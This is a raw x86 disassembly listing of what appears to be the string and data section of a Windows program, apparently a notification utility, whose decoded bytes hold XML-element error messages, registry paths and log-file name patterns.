  401dd4:	imul   eax,DWORD PTR [eax],0x67006e
  401dda:	add    BYTE PTR [eax],al
  401ddc:	inc    esi
  401ddd:	popa   
  401dde:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  401de6:	imul   bp,WORD PTR [esi+0x64],0x6220
  401dec:	imul   ebp,DWORD PTR [esi+0x64],0x20676e69
  401df3:	gs ins BYTE PTR es:[edi],dx
  401df5:	gs ins DWORD PTR es:[edi],dx
  401df7:	outs   dx,BYTE PTR gs:[esi]
  401df9:	je     0x401e1b
  401dfb:	imul   ebp,DWORD PTR [esi+0x20],0x73616f74
  401e02:	je     0x401e24
  401e04:	js     0x401e73
  401e06:	ins    BYTE PTR es:[edi],dx
  401e07:	and    BYTE PTR [ebx+0x25],bl
  401e0a:	js     0x401e69
  401e0c:	add    BYTE PTR [eax],al
  401e0e:	add    BYTE PTR [eax],al
  401e10:	inc    esi
  401e11:	popa   
  401e12:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  401e1a:	imul   bp,WORD PTR [esi+0x64],0x7220
  401e20:	outs   dx,DWORD PTR ds:[esi]
  401e21:	outs   dx,DWORD PTR ds:[esi]
  401e22:	je     0x401e44
  401e24:	gs ins BYTE PTR es:[edi],dx
  401e26:	gs ins DWORD PTR es:[edi],dx
  401e28:	outs   dx,BYTE PTR gs:[esi]
  401e2a:	je     0x401e4c
  401e2c:	popa   
  401e2d:	jae    0x401e4f
  401e2f:	outs   dx,BYTE PTR ds:[esi]
  401e30:	outs   dx,DWORD PTR ds:[esi]
  401e31:	fs and BYTE PTR gs:[eax],dh
  401e35:	and    BYTE PTR [ebx+0x25],bl
  401e38:	js     0x401e97
  401e3a:	add    BYTE PTR [eax],al
  401e3c:	inc    esi
  401e3d:	popa   
  401e3e:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  401e46:	addr16 gs je 0x401e6a
  401e4a:	popa   
  401e4b:	je     0x401ec1
  401e4d:	jb     0x401eb8
  401e4f:	bound  esi,QWORD PTR [ebp+0x74]
  401e52:	gs jae 0x401e75
  401e55:	outs   dx,DWORD PTR ds:[esi]
  401e56:	outs   dx,BYTE PTR ds:[esi]
  401e57:	and    BYTE PTR [edx+0x69],ah
  401e5a:	outs   dx,BYTE PTR ds:[esi]
  401e5b:	imul   ebp,DWORD PTR fs:[esi+0x67],0x656c6520
  401e63:	ins    DWORD PTR es:[edi],dx
  401e64:	outs   dx,BYTE PTR gs:[esi]
  401e66:	je     0x401e88
  401e68:	pop    ebx
  401e69:	and    eax,0x5d78
  401e6e:	add    BYTE PTR [eax],al
  401e70:	je     0x401e72
  401e72:	add    BYTE PTR gs:[ebp+0x0],ch
  401e76:	jo     0x401e78
  401e78:	ins    BYTE PTR es:[edi],dx
  401e79:	add    BYTE PTR [ecx+0x0],ah
  401e7c:	je     0x401e7e
  401e7e:	add    BYTE PTR gs:[eax],al
  401e81:	add    BYTE PTR [eax],al
  401e83:	add    BYTE PTR [esi+0x61],al
  401e86:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  401e8e:	addr16 gs je 0x401eb2
  401e92:	je     0x401ef9
  401e94:	ins    DWORD PTR es:[edi],dx
  401e95:	jo     0x401f03
  401e97:	popa   
  401e98:	je     0x401eff
  401e9a:	and    BYTE PTR [ecx+0x74],ah
  401e9d:	je     0x401f11
  401e9f:	imul   esp,DWORD PTR [edx+0x75],0x6e206574
  401ea6:	outs   dx,DWORD PTR ds:[esi]
  401ea7:	fs and BYTE PTR gs:[esi+0x72],ah
  401eac:	outs   dx,DWORD PTR ds:[esi]
  401ead:	ins    DWORD PTR es:[edi],dx
  401eae:	and    BYTE PTR [ecx+0x74],ah
  401eb1:	je     0x401f25
  401eb3:	imul   esp,DWORD PTR [edx+0x75],0x6d206574
  401eba:	popa   
  401ebb:	jo     0x401edd
  401ebd:	pop    ebx
  401ebe:	and    eax,0x5d78
  401ec3:	add    BYTE PTR [esi+0x61],al
  401ec6:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  401ece:	arpl   WORD PTR [edi+0x6e],bp
  401ed1:	jbe    0x401f38
  401ed3:	jb     0x401f49
  401ed5:	and    BYTE PTR [ebp+eiz*2+0x6d],dh
  401ed9:	jo     0x401f47
  401edb:	popa   
  401edc:	je     0x401f43
  401ede:	and    BYTE PTR [ecx+0x74],ah
  401ee1:	je     0x401f55
  401ee3:	imul   esp,DWORD PTR [edx+0x75],0x66206574
  401eea:	jb     0x401f5b
  401eec:	ins    DWORD PTR es:[edi],dx
  401eed:	and    BYTE PTR [esi+0x6f],ch
  401ef0:	fs and BYTE PTR gs:[ebx+0x25],bl
  401ef5:	js     0x401f54
  401ef7:	add    BYTE PTR [eax+eax*1+0x6f],dl
  401efb:	add    BYTE PTR [ecx+0x0],ah
  401efe:	jae    0x401f00
  401f00:	je     0x401f02
  401f02:	inc    edi
  401f03:	add    BYTE PTR [ebp+0x0],ah
  401f06:	outs   dx,BYTE PTR ds:[esi]
  401f07:	add    BYTE PTR [ebp+0x0],ah
  401f0a:	jb     0x401f0c
  401f0c:	imul   eax,DWORD PTR [eax],0x63
  401f12:	add    BYTE PTR [eax],al
  401f14:	inc    esi
  401f15:	popa   
  401f16:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  401f1e:	jae    0x401f85
  401f20:	je     0x401f42
  401f22:	je     0x401f89
  401f24:	ins    DWORD PTR es:[edi],dx
  401f25:	jo     0x401f93
  401f27:	popa   
  401f28:	je     0x401f8f
  401f2a:	and    BYTE PTR [ecx+0x74],ah
  401f2d:	je     0x401fa1
  401f2f:	imul   esp,DWORD PTR [edx+0x75],0x76206574
  401f36:	popa   
  401f37:	ins    BYTE PTR es:[edi],dx
  401f38:	jne    0x401f9f
  401f3a:	and    BYTE PTR [ebx+0x25],bl
  401f3d:	js     0x401f9c
  401f3f:	add    BYTE PTR [eax+eax*1+0x6f],dh
  401f43:	add    BYTE PTR [ecx+0x0],ah
  401f46:	jae    0x401f48
  401f48:	je     0x401f4a
  401f4a:	add    BYTE PTR [eax],al
  401f4c:	inc    esi
  401f4d:	popa   
  401f4e:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  401f56:	imul   bp,WORD PTR [esi+0x64],0x7220
  401f5c:	outs   dx,DWORD PTR ds:[esi]
  401f5d:	outs   dx,DWORD PTR ds:[esi]
  401f5e:	je     0x401f80
  401f60:	gs ins BYTE PTR es:[edi],dx
  401f62:	gs ins DWORD PTR es:[edi],dx
  401f64:	outs   dx,BYTE PTR gs:[esi]
  401f66:	je     0x401f88
  401f68:	popa   
  401f69:	jae    0x401f8b
  401f6b:	outs   dx,BYTE PTR ds:[esi]
  401f6c:	outs   dx,DWORD PTR ds:[esi]
  401f6d:	fs and BYTE PTR gs:[ecx+ebp*2+0x73],ch
  401f73:	je     0x401f95
  401f75:	pop    ebx
  401f76:	and    eax,0x5d78
  401f7b:	add    BYTE PTR [eax+eax*1+0x61],ch
  401f7f:	add    BYTE PTR [ebp+0x0],dh
  401f82:	outs   dx,BYTE PTR ds:[esi]
  401f83:	add    BYTE PTR [ebx+0x0],ah
  401f86:	push   0x0
  401f8b:	add    BYTE PTR [esi+0x61],al
  401f8e:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  401f96:	popa   
  401f97:	fs and BYTE PTR fs:[ecx+eiz*2+0x75],ch
  401f9d:	outs   dx,BYTE PTR ds:[esi]
  401f9e:	arpl   WORD PTR [eax+0x20],bp
  401fa1:	popa   
  401fa2:	je     0x402018
  401fa4:	jb     0x40200f
  401fa6:	bound  esi,QWORD PTR [ebp+0x74]
  401fa9:	and    BYTE PTR gs:[ebx+0x25],bl
  401fad:	js     0x40200c
  401faf:	add    BYTE PTR [eax+0x0],dh
  401fb2:	jb     0x401fb4
  401fb4:	outs   dx,DWORD PTR ds:[esi]
  401fb5:	add    BYTE PTR [eax+eax*1+0x6f],dh
  401fb9:	add    BYTE PTR [ebx+0x0],ah
  401fbc:	outs   dx,DWORD PTR ds:[esi]
  401fbd:	add    BYTE PTR [eax+eax*1+0x0],ch
  401fc1:	add    BYTE PTR [eax],al
  401fc3:	add    BYTE PTR [ecx+0x0],ah
  401fc6:	arpl   WORD PTR [eax],ax
  401fc8:	je     0x401fca
  401fca:	imul   eax,DWORD PTR [eax],0x610076
  401fd0:	je     0x401fd2
  401fd2:	imul   eax,DWORD PTR [eax],0x6e006f
  401fd8:	push   esp
  401fd9:	add    BYTE PTR [ecx+0x0],bh
  401fdc:	jo     0x401fde
  401fde:	add    BYTE PTR gs:[eax],al
  401fe1:	add    BYTE PTR [eax],al
  401fe3:	add    BYTE PTR [esi+0x61],al
  401fe6:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  401fee:	popa   
  401fef:	fs and BYTE PTR fs:[ecx+0x63],ah
  401ff4:	je     0x40205f
  401ff6:	jbe    0x402059
  401ff8:	je     0x402063
  401ffa:	outs   dx,DWORD PTR ds:[esi]
  401ffb:	outs   dx,BYTE PTR ds:[esi]
  401ffc:	push   esp
  401ffd:	jns    0x40206f
  401fff:	and    BYTE PTR gs:[ecx+0x74],ah
  402003:	je     0x402077
  402005:	imul   esp,DWORD PTR [edx+0x75],0x5b206574
  40200c:	and    eax,0x46005d78
  402011:	popa   
  402012:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  40201a:	addr16 gs je 0x40203e
  40201e:	popa   
  40201f:	je     0x402095
  402021:	jb     0x40208c
  402023:	bound  esi,QWORD PTR [ebp+0x74]
  402026:	gs jae 0x402049
  402029:	outs   dx,WORD PTR ds:[esi]
  40202b:	jb     0x40204d
  40202d:	outs   dx,BYTE PTR ds:[esi]
  40202e:	outs   dx,DWORD PTR ds:[esi]
  40202f:	fs and BYTE PTR gs:[ebx+0x25],bl
  402034:	js     0x402093
  402036:	add    BYTE PTR [eax],al
  402038:	pop    edi
  402039:	inc    ecx
  40203a:	fs fs inc ecx
  40203d:	je     0x4020b3
  40203f:	jb     0x4020aa
  402041:	bound  esi,QWORD PTR [ebp+0x74]
  402044:	add    BYTE PTR gs:[eax],al
  402047:	add    BYTE PTR [esi+0x61],al
  40204a:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  402052:	arpl   WORD PTR [edx+0x65],si
  402055:	popa   
  402056:	je     0x4020bd
  402058:	and    BYTE PTR [esi+0x65],ch
  40205b:	ja     0x40207d
  40205d:	popa   
  40205e:	je     0x4020d4
  402060:	jb     0x4020cb
  402062:	bound  esi,QWORD PTR [ebp+0x74]
  402065:	and    BYTE PTR gs:[ebx+0x25],bl
  402069:	js     0x4020c8
  40206b:	add    BYTE PTR [esi+0x61],al
  40206e:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  402076:	jae    0x4020dd
  402078:	je     0x40209a
  40207a:	je     0x4020e4
  40207c:	and    BYTE PTR gs:[esi+0x61],dh
  402080:	ins    BYTE PTR es:[edi],dx
  402081:	jne    0x4020e8
  402083:	and    BYTE PTR [esi+0x6f],ah
  402086:	jb     0x4020a8
  402088:	outs   dx,BYTE PTR ds:[esi]
  402089:	gs ja  0x4020ac
  40208c:	popa   
  40208d:	je     0x402103
  40208f:	jb     0x4020fa
  402091:	bound  esi,QWORD PTR [ebp+0x74]
  402094:	and    BYTE PTR gs:[ebx+0x25],bl
  402098:	js     0x4020f7
  40209a:	add    BYTE PTR [eax],al
  40209c:	inc    esi
  40209d:	popa   
  40209e:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  4020a6:	addr16 gs je 0x4020ca
  4020aa:	outs   dx,BYTE PTR ds:[esi]
  4020ab:	gs ja  0x4020ce
  4020ae:	popa   
  4020af:	je     0x402125
  4020b1:	jb     0x40211c
  4020b3:	bound  esi,QWORD PTR [ebp+0x74]
  4020b6:	and    BYTE PTR gs:[ecx+0x73],ah
  4020ba:	and    BYTE PTR [ecx+0x20],ah
  4020bd:	outs   dx,BYTE PTR ds:[esi]
  4020be:	outs   dx,DWORD PTR ds:[esi]
  4020bf:	fs and BYTE PTR gs:[ebx+0x25],bl
  4020c4:	js     0x402123
  4020c6:	add    BYTE PTR [eax],al
  4020c8:	inc    esi
  4020c9:	popa   
  4020ca:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  4020d2:	popa   
  4020d3:	fs and BYTE PTR fs:[esi+0x65],ch
  4020d8:	ja     0x4020fa
  4020da:	popa   
  4020db:	je     0x402151
  4020dd:	jb     0x402148
  4020df:	bound  esi,QWORD PTR [ebp+0x74]
  4020e2:	and    BYTE PTR gs:[edi+ebp*2+0x20],dh
  4020e7:	jo     0x40214a
  4020e9:	jb     0x402150
  4020eb:	outs   dx,BYTE PTR ds:[esi]
  4020ec:	je     0x40210e
  4020ee:	outs   dx,BYTE PTR ds:[esi]
  4020ef:	outs   dx,DWORD PTR ds:[esi]
  4020f0:	fs and BYTE PTR gs:[ebx+0x25],bl
  4020f5:	js     0x402154
  4020f7:	add    BYTE PTR [edi+0x0],dl
  4020fa:	imul   eax,DWORD PTR [eax],0x64006e
  402100:	outs   dx,DWORD PTR ds:[esi]
  402101:	add    BYTE PTR [edi+0x0],dh
  402104:	jae    0x402106
  402106:	add    BYTE PTR cs:[ebx+0x0],dl
  40210a:	jns    0x40210c
  40210c:	jae    0x40210e
  40210e:	je     0x402110
  402110:	add    BYTE PTR gs:[ebp+0x0],ch
  402114:	push   esp
  402115:	add    BYTE PTR [edi+0x0],ch
  402118:	popa   
  402119:	add    BYTE PTR [ebx+0x0],dh
  40211c:	je     0x40211e
  40211e:	add    BYTE PTR cs:[ebx+0x0],al
  402122:	outs   dx,DWORD PTR ds:[esi]
  402123:	add    BYTE PTR [ebp+0x0],ch
  402126:	jo     0x402128
  402128:	popa   
  402129:	add    BYTE PTR [eax+eax*1+0x0],dh
  40212d:	add    BYTE PTR [eax],al
  40212f:	add    BYTE PTR [esi+0x61],al
  402132:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  40213a:	arpl   WORD PTR [edx+0x65],si
  40213d:	popa   
  40213e:	je     0x4021a5
  402140:	and    BYTE PTR [edi+ebp*2+0x61],dh
  402144:	jae    0x4021ba
  402146:	and    BYTE PTR [esi+0x6f],ch
  402149:	je     0x4021b4
  40214b:	imul   sp,WORD PTR [ebp+0x72],0x5b20
  402151:	and    eax,0x5d78
  402156:	add    BYTE PTR [eax],al
  402158:	pop    edi
  402159:	push   ebx
  40215a:	push   0x6f4e776f
  40215f:	je     0x4021ca
  402161:	imul   sp,WORD PTR [ebx+0x61],0x6974
  402167:	outs   dx,DWORD PTR ds:[esi]
  402168:	outs   dx,BYTE PTR ds:[esi]
  402169:	push   esp
  40216a:	outs   dx,DWORD PTR ds:[esi]
  40216b:	popa   
  40216c:	jae    0x4021e2
  40216e:	add    BYTE PTR [eax],al
  402170:	inc    esi
  402171:	popa   
  402172:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  40217a:	arpl   WORD PTR [edx+0x65],si
  40217d:	popa   
  40217e:	je     0x4021e5
  402180:	and    BYTE PTR [edi+ebp*2+0x61],dl
  402184:	jae    0x4021fa
  402186:	dec    esi
  402187:	outs   dx,DWORD PTR ds:[esi]
  402188:	je     0x4021f3
  40218a:	imul   sp,WORD PTR [ebx+0x61],0x6974
  402190:	outs   dx,DWORD PTR ds:[esi]
  402191:	outs   dx,BYTE PTR ds:[esi]
  402192:	and    BYTE PTR [esi+0x61],ah
  402195:	arpl   WORD PTR [edi+ebp*2+0x72],si
  402199:	jns    0x4021bb
  40219b:	pop    ebx
  40219c:	and    eax,0x46005d78
  4021a1:	popa   
  4021a2:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  4021aa:	arpl   WORD PTR [edx+0x65],si
  4021ad:	popa   
  4021ae:	je     0x402215
  4021b0:	and    BYTE PTR [edi+ebp*2+0x61],dh
  4021b4:	jae    0x40222a
  4021b6:	and    BYTE PTR [ebx+0x25],bl
  4021b9:	js     0x402218
  4021bb:	add    BYTE PTR [esi+0x61],al
  4021be:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  4021c6:	jae    0x402230
  4021c8:	outs   dx,DWORD PTR ds:[esi]
  4021c9:	ja     0x4021eb
  4021cb:	je     0x40223c
  4021cd:	popa   
  4021ce:	jae    0x402244
  4021d0:	and    BYTE PTR [ebx+0x25],bl
  4021d3:	js     0x402232
  4021d5:	add    BYTE PTR [eax],al
  4021d7:	add    BYTE PTR [ebx+0x72],al
  4021da:	gs popa 
  4021dc:	je     0x402243
  4021de:	push   esp
  4021df:	gs js  0x402256
  4021e2:	dec    esi
  4021e3:	outs   dx,DWORD PTR ds:[esi]
  4021e4:	fs and BYTE PTR gs:[esi+0x61],ah
  4021e9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x78255b20
  4021f1:	pop    ebp
  4021f2:	add    BYTE PTR [eax],al
  4021f4:	pop    edi
  4021f5:	push   ebx
  4021f6:	gs je  0x402247
  4021f9:	outs   dx,DWORD PTR ds:[esi]
  4021fa:	fs gs push esi
  4021fd:	popa   
  4021fe:	ins    BYTE PTR es:[edi],dx
  4021ff:	jne    0x402266
  402201:	push   ebx
  402202:	je     0x402276
  402204:	imul   ebp,DWORD PTR [esi+0x67],0x69614600
  40220b:	ins    BYTE PTR es:[edi],dx
  40220c:	gs and BYTE PTR fs:[edi+ebp*2+0x20],dh
  402212:	addr16 gs je 0x402236
  402216:	dec    ecx
  402217:	pop    eax
  402218:	ins    DWORD PTR es:[edi],dx
  402219:	ins    BYTE PTR es:[edi],dx
  40221a:	dec    esi
  40221b:	outs   dx,DWORD PTR ds:[esi]
  40221c:	fs and BYTE PTR gs:[esi+0x72],ah
  402221:	outs   dx,DWORD PTR ds:[esi]
  402222:	ins    DWORD PTR es:[edi],dx
  402223:	and    BYTE PTR [ecx+0x58],cl
  402226:	ins    DWORD PTR es:[edi],dx
  402227:	ins    BYTE PTR es:[edi],dx
  402228:	push   esp
  402229:	gs js  0x4022a0
  40222c:	and    BYTE PTR [ebx+0x25],bl
  40222f:	js     0x40228e
  402231:	add    BYTE PTR [eax],al
  402233:	add    BYTE PTR [esi+0x61],al
  402236:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  40223e:	popa   
  40223f:	jo     0x4022b1
  402241:	outs   dx,BYTE PTR gs:[esi]
  402243:	and    BYTE PTR fs:[ebx+0x68],ah
  402247:	imul   ebp,DWORD PTR [esp+eiz*2+0x20],0x6c6d5849
  40224f:	dec    esi
  402250:	outs   dx,DWORD PTR ds:[esi]
  402251:	fs and BYTE PTR gs:[ebx+0x25],bl
  402256:	js     0x4022b5
	...
  402260:	pop    edi
  402261:	push   ebx
  402262:	push   0x436c6c65
  402267:	outs   dx,DWORD PTR ds:[esi]
  402268:	outs   dx,BYTE PTR ds:[esi]
  402269:	jae    0x4022df
  40226b:	jb     0x4022e2
  40226d:	arpl   WORD PTR [esp+edx*2+0x6f],si
  402271:	popa   
  402272:	jae    0x4022e8
  402274:	dec    ebp
  402275:	gs jae 0x4022eb
  402278:	popa   
  402279:	addr16 gs push ebx
  40227c:	je     0x4022f0
  40227e:	imul   ebp,DWORD PTR [esi+0x67],0x69616620
  402285:	ins    BYTE PTR es:[edi],dx
  402286:	gs and BYTE PTR fs:[edi+ebp*2+0x20],dh
  40228c:	outs   dx,WORD PTR ds:[esi]
  40228e:	jb     0x4022fd
  402290:	popa   
  402291:	je     0x4022b3
  402293:	push   esp
  402294:	imul   esi,DWORD PTR [esp+ebp*2+0x65],0x74786554
  40229c:	and    BYTE PTR [eax],ch
  40229e:	imul   esp,DWORD PTR [edx+edi*1+0x20],0x296425
  4022a6:	add    BYTE PTR [eax],al
  4022a8:	pop    edi
  4022a9:	inc    esi
  4022aa:	outs   dx,DWORD PTR ds:[esi]
  4022ab:	jb     0x40231a
  4022ad:	popa   
  4022ae:	je     0x4022f1
  4022b0:	jo     0x402322
  4022b2:	ins    BYTE PTR es:[edi],dx
  4022b3:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  4022ba:	inc    edx
  4022bb:	ins    BYTE PTR es:[edi],dx
  4022bc:	outs   dx,DWORD PTR ds:[esi]
  4022bd:	arpl   WORD PTR [ebx+0x54],bp
  4022c0:	outs   dx,DWORD PTR ds:[esi]
  4022c1:	popa   
  4022c2:	jae    0x402338
  4022c4:	push   esp
  4022c5:	gs js  0x40233c
	...
  4022d0:	pop    edi
  4022d1:	push   ebx
  4022d2:	push   0x436c6c65
  4022d7:	outs   dx,DWORD PTR ds:[esi]
  4022d8:	outs   dx,BYTE PTR ds:[esi]
  4022d9:	jae    0x40234f
  4022db:	jb     0x402352
  4022dd:	arpl   WORD PTR [esp+edx*2+0x6f],si
  4022e1:	popa   
  4022e2:	jae    0x402358
  4022e4:	dec    ebp
  4022e5:	gs jae 0x40235b
  4022e8:	popa   
  4022e9:	addr16 gs push ebx
  4022ec:	je     0x402360
  4022ee:	imul   ebp,DWORD PTR [esi+0x67],0x69616620
  4022f5:	ins    BYTE PTR es:[edi],dx
  4022f6:	gs and BYTE PTR fs:[edi+ebp*2+0x20],dh
  4022fc:	outs   dx,WORD PTR ds:[esi]
  4022fe:	jb     0x40236d
  402300:	popa   
  402301:	je     0x402323
  402303:	inc    esp
  402304:	gs je  0x402368
  402307:	imul   ebp,DWORD PTR [ebx+esi*2+0x54],0x20747865
  40230f:	sub    BYTE PTR [ecx+0x64],ch
  402312:	cmp    ah,BYTE PTR [eax]
  402314:	and    eax,0x5f002964
  402319:	push   ebx
  40231a:	push   0x436c6c65
  40231f:	outs   dx,DWORD PTR ds:[esi]
  402320:	outs   dx,BYTE PTR ds:[esi]
  402321:	jae    0x402397
  402323:	jb     0x40239a
  402325:	arpl   WORD PTR [esp+edx*2+0x6f],si
  402329:	popa   
  40232a:	jae    0x4023a0
  40232c:	dec    ebp
  40232d:	gs jae 0x4023a3
  402330:	popa   
  402331:	addr16 gs push ebx
  402334:	je     0x4023a8
  402336:	imul   ebp,DWORD PTR [esi+0x67],0x69616620
  40233d:	ins    BYTE PTR es:[edi],dx
  40233e:	gs and BYTE PTR fs:[edi+ebp*2+0x20],dh
  402344:	outs   dx,WORD PTR ds:[esi]
  402346:	jb     0x4023b5
  402348:	popa   
  402349:	je     0x40236b
  40234b:	dec    eax
  40234c:	gs popa 
  40234e:	fs gs jb 0x4023a6
  402352:	gs js  0x4023c9
  402355:	and    BYTE PTR [eax],ch
  402357:	imul   esp,DWORD PTR [edx+edi*1+0x20],0x296425
  40235f:	add    BYTE PTR [eax+0x52],dl
  402362:	dec    ecx
  402363:	dec    esi
  402364:	push   esp
  402365:	add    BYTE PTR [eax],al
  402367:	add    BYTE PTR [ebp+0x52],al
  40236a:	push   edx
  40236b:	dec    edi
  40236c:	push   edx
  40236d:	add    BYTE PTR [eax],al
  40236f:	add    BYTE PTR [ebp+0x41],cl
  402372:	push   edx
  402373:	dec    ebx
  402374:	add    BYTE PTR [eax],al
  402376:	add    BYTE PTR [eax],al
  402378:	push   esp
  402379:	push   edx
  40237a:	inc    ecx
  40237b:	inc    ebx
  40237c:	inc    ebp
  40237d:	add    BYTE PTR [eax],al
  40237f:	add    BYTE PTR [eax+eax*1+0x53],bl
  402383:	add    BYTE PTR [edi+0x0],ch
  402386:	data16 add BYTE PTR [eax+eax*1+0x77],dh
  40238b:	add    BYTE PTR [ecx+0x0],ah
  40238e:	jb     0x402390
  402390:	add    BYTE PTR gs:[eax+eax*1+0x4d],bl
  402395:	add    BYTE PTR [ecx+0x0],ch
  402398:	arpl   WORD PTR [eax],ax
  40239a:	jb     0x40239c
  40239c:	outs   dx,DWORD PTR ds:[esi]
  40239d:	add    BYTE PTR [ebx+0x0],dh
  4023a0:	outs   dx,DWORD PTR ds:[esi]
  4023a1:	add    BYTE PTR [esi+0x0],ah
  4023a4:	je     0x4023a6
  4023a6:	pop    esp
  4023a7:	add    BYTE PTR [edi+0x0],dl
  4023aa:	imul   eax,DWORD PTR [eax],0x64006e
  4023b0:	outs   dx,DWORD PTR ds:[esi]
  4023b1:	add    BYTE PTR [edi+0x0],dh
  4023b4:	jae    0x4023b6
  4023b6:	and    BYTE PTR [eax],al
  4023b8:	dec    esi
  4023b9:	add    BYTE PTR [eax+eax*1+0x5c],dl
  4023bd:	add    BYTE PTR [ebx+0x0],al
  4023c0:	jne    0x4023c2
  4023c2:	jb     0x4023c4
  4023c4:	jb     0x4023c6
  4023c6:	add    BYTE PTR gs:[esi+0x0],ch
  4023ca:	je     0x4023cc
  4023cc:	push   esi
  4023cd:	add    BYTE PTR [ebp+0x0],ah
  4023d0:	jb     0x4023d2
  4023d2:	jae    0x4023d4
  4023d4:	imul   eax,DWORD PTR [eax],0x6e006f
  4023da:	pop    esp
  4023db:	add    BYTE PTR [ecx+0x0],al
  4023de:	jo     0x4023e0
  4023e0:	jo     0x4023e2
  4023e2:	inc    ebx
  4023e3:	add    BYTE PTR [edi+0x0],ch
  4023e6:	ins    DWORD PTR es:[edi],dx
  4023e7:	add    BYTE PTR [eax+0x0],dh
  4023ea:	popa   
  4023eb:	add    BYTE PTR [eax+eax*1+0x46],dh
  4023ef:	add    BYTE PTR [eax+eax*1+0x61],ch
  4023f3:	add    BYTE PTR [edi+0x0],ah
  4023f6:	jae    0x4023f8
  4023f8:	add    BYTE PTR [eax],al
  4023fa:	add    BYTE PTR [eax],al
  4023fc:	dec    esp
  4023fd:	add    BYTE PTR [edi+0x0],ch
  402400:	add    BYTE PTR [bp+0x0],al
  402404:	ins    BYTE PTR es:[edi],dx
  402405:	add    BYTE PTR [ecx+0x0],ah
  402408:	add    BYTE PTR [bp+di+0x0],dh
  40240c:	add    BYTE PTR [eax],al
  40240e:	add    BYTE PTR [eax],al
  402410:	and    eax,0x5c007300
  402415:	add    BYTE PTR [eax+eax*1+0x65],dl
  402419:	add    BYTE PTR [ebp+0x0],ch
  40241c:	jo     0x40241e
  40241e:	pop    esp
  40241f:	add    BYTE PTR [ecx+0x0],al
  402422:	jae    0x402424
  402424:	ins    BYTE PTR es:[edi],dx
  402425:	add    BYTE PTR [eax+eax*1+0x6f],cl
  402429:	add    BYTE PTR [edi+0x0],ah
  40242c:	pop    edi
  40242d:	add    BYTE PTR ds:0x5f005300,ah
  402433:	add    BYTE PTR ds:0x5f007300,ah
  402439:	add    BYTE PTR ds:0x2e006400,ah
  40243f:	add    BYTE PTR [eax+eax*1+0x78],dh
  402443:	add    BYTE PTR [eax+eax*1+0x0],dh
  402447:	add    BYTE PTR ds:0x2500000a,cl
  40244d:	jae    0x40247b
  40244f:	and    eax,0x64252c73
  402454:	sub    al,0x0
  402456:	add    BYTE PTR [eax],al
  402458:	inc    ecx
  402459:	push   ebx
  40245a:	dec    esp
  40245b:	pop    edi
  40245c:	dec    esp
  40245d:	dec    edi
  40245e:	inc    edi
  40245f:	and    BYTE PTR [esi+0x41],al
  402462:	dec    ecx
  402463:	dec    esp
  402464:	cmp    ah,BYTE PTR [eax]
	...
  40246e:	add    BYTE PTR [eax],al
  402470:	dec    ebp
  402471:	gs jae 0x4024e7
  402474:	popa   
  402475:	and    BYTE PTR gs:[si+0x6f],dh
  40247a:	outs   dx,DWORD PTR ds:[esi]
  40247b:	and    BYTE PTR [edi+ebp*2+0x6e],ch
  40247f:	and    DWORD PTR [bx+si],eax
  402482:	add    BYTE PTR [eax],al
  402484:	add    BYTE PTR [eax],al
  402486:	add    BYTE PTR [eax],al
  402488:	pusha  
  402489:	and    eax,DWORD PTR [eax+0x0]
  40248c:	add    DWORD PTR [eax],eax
  40248e:	add    BYTE PTR [eax],al
  402490:	push   0x2004023
  402495:	add    BYTE PTR [eax],al
  402497:	add    BYTE PTR [eax+0x23],dh
  40249a:	inc    eax
  40249b:	add    BYTE PTR [ebx],al
  40249d:	add    BYTE PTR [eax],al
  40249f:	add    BYTE PTR [eax+0x23],bh
  4024a2:	inc    eax
  4024a3:	add    BYTE PTR [eax],al
  4024a5:	add    BYTE PTR [eax],al
  4024a7:	add    BYTE PTR [ecx+0x0],ah
  4024aa:	jo     0x4024ac
  4024ac:	imul   eax,DWORD PTR [eax],0x6d002d
  4024b2:	jae    0x4024b4
  4024b4:	sub    eax,0x69007700
  4024b9:	add    BYTE PTR [esi+0x0],ch
  4024bc:	sub    eax,0x76006500
  4024c1:	add    BYTE PTR [ebp+0x0],ah
  4024c4:	outs   dx,BYTE PTR ds:[esi]
  4024c5:	add    BYTE PTR [eax+eax*1+0x69],dh
  4024c9:	add    BYTE PTR [esi+0x0],ch
  4024cc:	add    BYTE PTR [di],ch
  4024cf:	add    BYTE PTR [eax+0x0],dh
  4024d2:	jb     0x4024d4
  4024d4:	outs   dx,DWORD PTR ds:[esi]
  4024d5:	add    BYTE PTR [esi+0x0],dh
  4024d8:	imul   eax,DWORD PTR [eax],0x650064
  4024de:	jb     0x4024e0
  4024e0:	sub    eax,0x31006c00
  4024e5:	add    BYTE PTR ds:0x2d003100,ch
  4024eb:	add    BYTE PTR [eax],dh
  4024ed:	add    BYTE PTR [eax],al
  4024ef:	add    BYTE PTR [ecx+0x0],ah
  4024f2:	add    BYTE PTR fs:[esi+0x0],dh
  4024f6:	popa   
  4024f7:	add    BYTE PTR [eax+0x0],dh
  4024fa:	imul   eax,DWORD PTR [eax],0x320033
  402500:	add    BYTE PTR [eax],al
  402502:	add    BYTE PTR [eax],al
  402504:	inc    ebp
  402505:	jbe    0x40256c
  402507:	outs   dx,BYTE PTR ds:[esi]
  402508:	je     0x40255d
  40250a:	gs je  0x402556
